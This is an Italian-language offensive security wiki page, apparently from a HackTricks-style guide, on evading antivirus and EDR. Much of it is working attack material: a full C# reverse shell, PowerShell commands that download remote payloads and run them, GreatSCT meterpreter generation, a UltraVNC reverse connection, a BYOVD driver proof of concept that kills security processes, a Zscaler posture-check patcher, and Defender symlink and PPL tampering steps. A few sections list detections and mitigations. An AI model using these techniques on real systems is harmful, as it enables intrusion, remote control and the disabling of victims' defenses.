<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando payload dentro file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può essere usato anche dai prodotti di sicurezza per monitorare e rilevare attività malevole.

In modo simile a come AMSI viene disabilitato (bypassed), è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Questo viene fatto patchando la funzione in memoria in modo che ritorni subito, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Caricare binari C# in memoria è noto da parecchio tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza farti beccare da AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) già fornisce la possibilità di eseguire direttamente in memoria assembly C#, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nello **spawnare un nuovo processo sacrificial**, iniettare il tuo codice malevolo di post-exploitation in quel nuovo processo, eseguire il tuo codice malevolo e, una volta terminato, uccidere il nuovo processo. Questo ha sia vantaggi sia svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **fuori** dal nostro implant Beacon. Questo significa che, se qualcosa nella nostra azione di post-exploitation va storto o viene rilevato, c'è una **molto maggiore probabilità** che il nostro **implant sopravviva**. Lo svantaggio è che c'è una **maggiore probabilità** di essere rilevati dalle **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo, puoi evitare di creare un nuovo processo e farlo scansionare da AV, ma lo svantaggio è che, se qualcosa va storto nell'esecuzione del tuo payload, c'è una **molto maggiore probabilità** di **perdere il tuo beacon** perché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere di più sul caricamento di C# Assembly, controlla questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**, controlla [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi dando alla macchina compromessa accesso **all'ambiente interprete installato sulla condivisione SMB controllata dall'Attacker**.

Consentendo l'accesso ai binary dell'interprete e all'ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi dentro la memoria** della macchina compromessa.

Il repo indica: Defender esegue comunque la scansione degli script ma, usando Go, Java, PHP ecc., abbiamo **più flessibilità per bypassare le firme statiche**. I test con reverse shell script casuali non offuscati in questi linguaggi hanno avuto successo.

## TokenStomping

Token stomping è una tecnica che consente a un attaccante di **manipolare l'access token o un security prouct come un EDR o AV**, permettendogli di ridurne i privilegi così che il processo non muoia ma non abbia i permessi per controllare attività malevole.

Per prevenirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop su un PC della vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricare il file MSI.
2. Esegui l'installer in modo silenzioso sulla vittima (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca next. La procedura guidata ti chiederà di autorizzare; clicca il pulsante Authorize per continuare.
4. Esegui il parametro dato con alcune modifiche: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il pin senza usare la GUI).


## Advanced Evasion

L'evasion è un argomento molto complesso; a volte devi tenere conto di molte fonti diverse di telemetria in un solo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui operi avrà i propri punti di forza e di debolezza.

Ti incoraggio vivamente a guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per ottenere un punto d'appoggio nelle tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binary** fino a **scoprire quale parte Defender** considera malevola e dividerla per te.\
Un altro tool che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web aperto disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutti i Windows avevano un **Telnet server** che potevi installare (come amministratore) facendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** quando il sistema viene avviato e **eseguirlo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (ti servono i download bin, non il setup)

**SUL HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binary _**winvnc.exe**_ e il file _**UltraVNC.ini**_ **appena** creato dentro il **victim**

#### **Reverse connection**

L'**attacker** dovrebbe **eseguire dentro** il suo **host** il binary `vncviewer.exe -listen 5900` così da essere **pronto** a catturare una reverse **VNC connection**. Poi, dentro il **victim**: Avvia il daemon winvnc `winvnc.exe -run` e esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Per mantenere la stealth non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione oppure attiverai un [popup](https://i.imgur.com/1SROTTl.png). verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory oppure causerà l'apertura della [config window](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per l'help oppure attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` ed **esegui** il **payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Il defender attuale terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima Reverse Shell in C#

Compilala con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatica:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscator C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Using python for build injectors example:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Other tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Porta il tuo driver vulnerabile (BYOVD) – Uccidere AV/EDR dalla kernel space

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento porta il suo **driver vulnerabile ma *firmato*** e lo abusa per eseguire operazioni privilegiate nel kernel che persino i servizi AV Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Driver firmato**: Il file scritto su disco è `ServiceMouse.sys`, ma il binary è il driver firmato legittimamente `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del servizio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile da user land.
3. **IOCTL esposti dal driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Termina un processo arbitrario per PID (usato per uccidere i servizi Defender/EDR) |
| `0x990000D0` | Elimina un file arbitrario su disco |
| `0x990001D0` | Scarica il driver e rimuove il servizio |

Proof-of-concept minimale in C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**:  BYOVD salta completamente le protezioni user-mode; il codice che esegue nel kernel può aprire processi *protetti*, terminarli o alterare gli oggetti kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Detection / Mitigation
•  Abilitare la vulnerable-driver block list di Microsoft (`HVCI`, `Smart App Control`) così Windows rifiuta di caricare `AToolsKrnl64.sys`.
•  Monitorare la creazione di nuovi servizi *kernel* e generare alert quando un driver viene caricato da una directory world-writable o non è presente nella allow-list.
•  Sorvegliare handle user-mode verso oggetti device personalizzati seguiti da chiamate `DeviceIoControl` sospette.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

**Client Connector** di Zscaler applica localmente le regole di device-posture e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (al server viene inviato solo un boolean).
2. Gli endpoint RPC interni validano solo che l'eseguibile che si connette sia **firmato da Zscaler** (tramite `WinVerifyTrust`).

Con il **patching di quattro binary firmati su disco** entrambi i meccanismi possono essere neutralizzati:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1` quindi ogni controllo risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Saltati |

Estratto minimale del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack del servizio:

* **Tutti** i controlli di postura mostrano **verde/conforme**.
* Binari non firmati o modificati possono aprire gli endpoint RPC delle named-pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L’host compromesso ottiene accesso illimitato alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust puramente lato client e semplici controlli di firma possano essere aggirati con poche patch di byte.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) applica una gerarchia signer/level in modo che solo processi protetti di livello uguale o superiore possano manomettersi a vicenda. In ottica offensiva, se puoi avviare legittimamente un binario abilitato per PPL e controllarne gli argomenti, puoi trasformare una funzionalità benigno (ad es. logging) in una write primitive limitata, supportata da PPL, contro le directory protette usate da AV/EDR.

Cosa fa girare un processo come PPL
- L’EXE target (e qualsiasi DLL caricata) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un protection level compatibile che corrisponda al signer del binario (ad es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per signer anti-malware, `PROTECTION_LEVEL_WINDOWS` per signer Windows). Level errati falliranno alla creazione.

Vedi anche una introduzione più ampia a PP/PPL e alla protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Helper open-source: CreateProcessAsPPL (seleziona il protection level e inoltra gli argomenti all’EXE target):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Pattern di utilizzo:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si auto-avvia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con supporto PPL.
- ClipUp non riesce a fare il parsing di percorsi contenenti spazi; usa percorsi brevi 8.3 per puntare in posizioni normalmente protette.

8.3 short path helpers
- Elenca i nomi brevi: `dir /x` in ogni directory padre.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avvia il LOLBIN capace di PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (ad es. CreateProcessAsPPL).
2) Passa l'argomento del percorso di log di ClipUp per forzare la creazione di un file in una directory AV protetta (ad es. Defender Platform). Usa i nomi brevi 8.3 se necessario.
3) Se il binario di destinazione è normalmente aperto/bloccato dall'AV أثناء l'esecuzione (ad es. MsMpEng.exe), programma la scrittura al boot prima che l'AV si avvii installando un servizio auto-start che venga eseguito in modo affidabile prima. Verifica l'ordine di boot con Process Monitor (boot logging).
4) Al riavvio, la scrittura supportata da PPL avviene prima che l'AV blocchi i propri binari, corrompendo il file di destinazione e impedendo l'avvio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare il contenuto che ClipUp scrive oltre al posizionamento; il primitive è adatto alla corruption più che alla precise content injection.
- Richiede local admin/SYSTEM per installare/avviare un service e una finestra di reboot.
- Il timing è critico: il target non deve essere aperto; l’esecuzione al boot evita i file lock.

Detections
- Process creation di `ClipUp.exe` con argomenti insoliti, soprattutto se avviato da launcher non standard, intorno al boot.
- Nuovi services configurati per auto-start di binari sospetti e che partono in modo coerente prima di Defender/AV. Investigate la creazione/modifica del service prima dei fallimenti di avvio di Defender.
- File integrity monitoring sui binari/Platform directories di Defender; creazioni/modifiche inattese di file da parte di processi con protected-process flags.
- Telemetria ETW/EDR: cerca processi creati con `CREATE_PROTECTED_PROCESS` e uso anomalo di PPL level da parte di binari non-AV.

Mitigations
- WDAC/Code Integrity: limita quali signed binaries possono girare come PPL e sotto quali parent; blocca l’invocazione di ClipUp fuori da contesti legittimi.
- Service hygiene: limita la creazione/modifica di services auto-start e monitora la manipolazione dell’ordine di avvio.
- Assicurati che Defender tamper protection e le early-launch protections siano abilitate; indaga errori di startup che indicano corruption dei binari.
- Considera di disabilitare la generazione dei nomi brevi 8.3 sui volumi che ospitano security tooling se compatibile con il tuo environment (testa a fondo).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender sceglie la platform da cui eseguire enumerando le sottocartelle sotto:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (ad esempio, `4.18.25070.5-0`), poi avvia da lì i processi del Defender service (aggiornando di conseguenza i path del service/registry). Questa selezione si fida delle directory entries, inclusi i directory reparse points (symlinks). Un administrator può sfruttare questo per reindirizzare Defender verso un path scrivibile dall’attaccante e ottenere DLL sideloading o service disruption.

Preconditions
- Local Administrator (necessario per creare directories/symlinks sotto la cartella Platform)
- Possibilità di reboot o di forzare una nuova selezione della platform di Defender (service restart al boot)
- Richiesti solo built-in tools (mklink)

Perché funziona
- Defender blocca le scritture nelle sue cartelle, ma la selezione della platform si fida delle directory entries e sceglie la versione lessicograficamente più alta senza verificare che il target risolva in un path protetto/fidato.

Step-by-step (example)
1) Prepara una copia scrivibile della cartella platform corrente, ad esempio `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con versione superiore dentro Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verificare che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo path del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registry che riflette quella posizione.

Opzioni post-exploitation
- DLL sideloading/code execution: Droppa/sostituisci DLL che Defender carica dalla sua application directory per eseguire codice nei processi di Defender. Vedi la sezione sopra: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovi il version-symlink così, al prossimo avvio, il path configurato non si risolve e Defender non riesce ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce da sola privilege escalation; richiede diritti di admin.

## API/IAT Hooking + Call-Stack Spoofing con PIC (stile Crystal Kit)

I red team possono spostare l’evasion runtime fuori dal C2 implant e nel modulo target stesso facendo hooking della sua Import Address Table (IAT) e instradando le API selezionate attraverso codice position‑independent (PIC) controllato dall’attaccante. Questo generalizza l’evasion oltre la piccola superficie API che molti kit espongono (ad es. CreateProcessA), e estende le stesse protezioni ai BOFs e alle DLL post‑exploitation.

Approccio ad alto livello
- Metti un blob PIC accanto al modulo target usando un reflective loader (prepended o companion). Il PIC deve essere self‑contained e position‑independent.
- Quando la DLL host viene caricata, percorri il suo IMAGE_IMPORT_DESCRIPTOR e patcha le voci IAT per le importazioni target (ad es. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) per puntare a wrapper PIC sottili.
- Ogni wrapper PIC esegue le evasions prima di fare tail‑calling al vero indirizzo dell’API. Le evasions tipiche includono:
- Memory mask/unmask attorno alla chiamata (ad es. encrypt beacon regions, RWX→RX, cambia nomi/permessi delle pagine) e poi ripristino post‑call.
- Call‑stack spoofing: costruisci uno stack benigno e fai il transition verso l’API target in modo che l’analisi del call‑stack risolva frame attesi.
- Per compatibilità, esporta un’interfaccia così uno script Aggressor (o equivalente) può registrare quali API fare hooking per Beacon, BOFs e DLL post‑ex.

Perché IAT hooking qui
- Funziona per qualsiasi codice che usi l’import hookato, senza modificare il codice del tool o fare affidamento su Beacon per proxy di API specifiche.
- Copre le DLL post‑ex: fare hooking di LoadLibrary* ti permette di intercettare i caricamenti di moduli (ad es. System.Management.Automation.dll, clr.dll) e applicare la stessa masking/stack evasion alle loro chiamate API.
- Ripristina un uso affidabile dei comandi post‑ex che avviano processi contro le detection basate sul call‑stack, wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Applica la patch dopo le relocation/ASLR e prima del primo uso dell'import. Loader reflective come TitanLdr/AceLdr dimostrano hooking durante `DllMain` del modulo caricato.
- Mantieni i wrapper minuscoli e PIC-safe; risolvi la vera API tramite il valore originale IAT che hai catturato prima del patching oppure tramite `LdrGetProcedureAddress`.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine scrivibili+eseguibili.

Call‑stack spoofing stub
- I PIC stub in stile Draugr costruiscono una finta call chain (return addresses in moduli benigni) e poi pivotano nella vera API.
- Questo aggira le detection che si aspettano stack canonici da Beacon/BOF verso API sensibili.
